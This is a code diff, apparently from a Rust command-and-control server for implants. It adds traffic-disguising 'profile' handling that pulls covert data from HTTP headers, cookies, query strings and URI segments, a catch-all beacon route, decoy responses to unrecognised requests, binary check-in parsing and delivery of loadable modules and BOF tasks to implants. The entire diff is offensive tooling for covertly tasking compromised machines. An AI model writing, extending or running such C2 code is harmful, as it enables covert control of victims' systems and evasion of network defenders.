@@ -53,7 +53,12 @@ pub fn build_router(state: HttpState) -> Router {
         .route("/api/checkin", post(checkin_handler))
         .route("/api/beacon", post(beacon_handler))
         .route("/api/health", get(health_handler))
-        .route("/api/ws", get(ws_handler::ws_upgrade_handler));
+        .route("/api/ws", get(ws_handler::ws_upgrade_handler))
+        // Catch-all for profile-driven URIs: any POST to /api/* routes to
+        // the beacon handler. This allows implants using profile URIs
+        // (e.g., /api/v1/status) to reach the handler without explicit
+        // route registration.
+        .route("/api/{*rest}", post(beacon_handler));
 
     // If a profile is configured, add profile-driven routes
     if let Some(ref profile) = state.listener_profile {
@@ -99,14 +104,23 @@ async fn profile_handler(
         return decoy_handler().await.into_response();
     }
 
+    // Capture headers and URI before consuming the request body
+    let req_headers = request.headers().clone();
+    let req_uri = request.uri().clone();
+
     // Extract body
     let body_bytes = match axum::body::to_bytes(request.into_body(), 1024 * 1024).await {
         Ok(b) => b,
         Err(_) => return decoy_handler().await.into_response(),
     };
 
-    // Extract embedded data from request body
-    let encoded_data = match extract_embedded_data(&body_bytes, &profile.request_template) {
+    // Extract embedded data from request
+    let encoded_data = match extract_embedded_data(
+        &body_bytes,
+        &profile.request_template,
+        &req_headers,
+        &req_uri,
+    ) {
         Some(data) => data,
         None => return decoy_handler().await.into_response(),
     };
@@ -117,10 +131,13 @@ async fn profile_handler(
         Err(_) => return decoy_handler().await.into_response(),
     };
 
-    // Parse decrypted JSON checkin request
-    let checkin_req: CheckinRequest = match serde_json::from_slice(&plaintext) {
-        Ok(r) => r,
-        Err(_) => return decoy_handler().await.into_response(),
+    // Try TLV binary first (implant sends TLV), then JSON fallback
+    let (checkin_req, is_binary) = if let Some(parsed) = parse_binary_checkin(&plaintext) {
+        (parsed, true)
+    } else if let Ok(parsed) = serde_json::from_slice::<CheckinRequest>(&plaintext) {
+        (parsed, false)
+    } else {
+        return decoy_handler().await.into_response();
     };
 
     // Process check-in
@@ -164,7 +181,7 @@ async fn profile_handler(
         tasks_payload.push(PendingTaskPayload {
             task_id: t.id.clone(),
             task_type: t.task_type.clone(),
-            arguments: String::from_utf8_lossy(&t.arguments).to_string(),
+            arguments: t.arguments.clone(),
         });
     }
 
@@ -182,12 +199,18 @@ async fn profile_handler(
         }
     }
 
-    // Transform response: compress → encrypt → encode
-    let resp_json = match serde_json::to_vec(&resp) {
-        Ok(j) => j,
-        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
+    // Serialize response: binary TLV if request was binary, JSON otherwise
+    let resp_bytes = if is_binary {
+        serialize_binary_response(&resp)
+    } else {
+        match serde_json::to_vec(&resp) {
+            Ok(j) => j,
+            Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
+        }
     };
-    let encoded_resp = match transform_encode(&resp_json, &profile.transform, &session_key) {
+
+    // Transform response: compress → encrypt → encode
+    let encoded_resp = match transform_encode(&resp_bytes, &profile.transform, &session_key) {
         Ok(e) => e,
         Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
     };
@@ -196,24 +219,75 @@ async fn profile_handler(
     format_profile_response(&encoded_resp, &profile.response_template).into_response()
 }
 
-/// Extract embedded data from the request body based on the profile's embed points.
-pub fn extract_embedded_data(body: &[u8], template: &HttpTemplate) -> Option<Vec<u8>> {
-    let body_str = std::str::from_utf8(body).ok()?;
-
+/// Extract embedded data from the request based on the profile's embed points.
+///
+/// Supports all embed locations: JSON body fields, HTTP headers, cookies,
+/// query parameters, and URI segments.  Multipart fields log a warning
+/// (not yet implemented).
+pub fn extract_embedded_data(
+    body: &[u8],
+    template: &HttpTemplate,
+    headers: &axum::http::HeaderMap,
+    uri: &axum::http::Uri,
+) -> Option<Vec<u8>> {
     for ep in &template.data_embed_points {
+        let field_name = ep.field_name.as_deref().unwrap_or("");
         match ep.location {
             EmbedLocation::JsonField => {
-                let field_name = ep.field_name.as_deref()?;
+                let body_str = std::str::from_utf8(body).ok()?;
                 let json: serde_json::Value = serde_json::from_str(body_str).ok()?;
                 let field_value = json.get(field_name)?.as_str()?;
                 return Some(field_value.as_bytes().to_vec());
             }
-            EmbedLocation::QueryParam
-            | EmbedLocation::CookieValue
-            | EmbedLocation::UriSegment
-            | EmbedLocation::MultipartField
-            | EmbedLocation::HeaderValue => {
-                // For JSON-based profiles, fall through to body parsing
+            EmbedLocation::HeaderValue => {
+                if let Some(val) = headers.get(field_name) {
+                    if let Ok(s) = val.to_str() {
+                        return Some(s.as_bytes().to_vec());
+                    }
+                }
+            }
+            EmbedLocation::CookieValue => {
+                // Parse the Cookie header to find the named cookie
+                if let Some(cookie_header) = headers.get("cookie") {
+                    if let Ok(cookie_str) = cookie_header.to_str() {
+                        for pair in cookie_str.split(';') {
+                            let pair = pair.trim();
+                            if let Some((name, value)) = pair.split_once('=') {
+                                if name.trim() == field_name {
+                                    return Some(value.trim().as_bytes().to_vec());
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            EmbedLocation::QueryParam => {
+                if let Some(query) = uri.query() {
+                    for pair in query.split('&') {
+                        if let Some((key, value)) = pair.split_once('=') {
+                            if key == field_name {
+                                return Some(value.as_bytes().to_vec());
+                            }
+                        }
+                    }
+                }
+            }
+            EmbedLocation::UriSegment => {
+                // Extract a segment from the URI path by field_name index or literal match.
+                // field_name is expected to be a 0-based index into path segments.
+                let path = uri.path();
+                let segments: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
+                if let Ok(idx) = field_name.parse::<usize>() {
+                    if let Some(seg) = segments.get(idx) {
+                        return Some(seg.as_bytes().to_vec());
+                    }
+                }
+            }
+            EmbedLocation::MultipartField => {
+                tracing::warn!(
+                    "MultipartField embed location not yet implemented (field: {})",
+                    field_name
+                );
                 continue;
             }
         }
@@ -355,24 +429,17 @@ async fn checkin_handler(
 
         // For load_module tasks, the arguments field contains the module_id.
         // Package the module for delivery (binary payload in arguments).
-        let (task_type, arguments) = if t.task_type == "load_module" {
+        let (task_type, arguments) = if t.task_type == "load_module" || t.task_type == "module_load" || t.task_type == "bof" || t.task_type == "bof_load" {
             if let Some(ref _module_repo) = state.module_repository {
-                let module_id = String::from_utf8_lossy(&t.arguments).to_string();
                 // Note: in the plain JSON check-in we don't have the implant pubkey,
                 // so we can't encrypt. Send module_id as argument for the implant to
                 // request via the encrypted beacon channel instead.
-                ("load_module".to_string(), module_id)
+                ("load_module".to_string(), t.arguments.clone())
             } else {
-                (
-                    t.task_type.clone(),
-                    String::from_utf8_lossy(&t.arguments).to_string(),
-                )
+                (t.task_type.clone(), t.arguments.clone())
             }
         } else {
-            (
-                t.task_type.clone(),
-                String::from_utf8_lossy(&t.arguments).to_string(),
-            )
+            (t.task_type.clone(), t.arguments.clone())
         };
 
         tasks_payload.push(PendingTaskPayload {
@@ -543,7 +610,7 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
         tasks_payload.push(PendingTaskPayload {
             task_id: t.id.clone(),
             task_type: t.task_type.clone(),
-            arguments: String::from_utf8_lossy(&t.arguments).to_string(),
+            arguments: t.arguments.clone(),
         });
     }
 
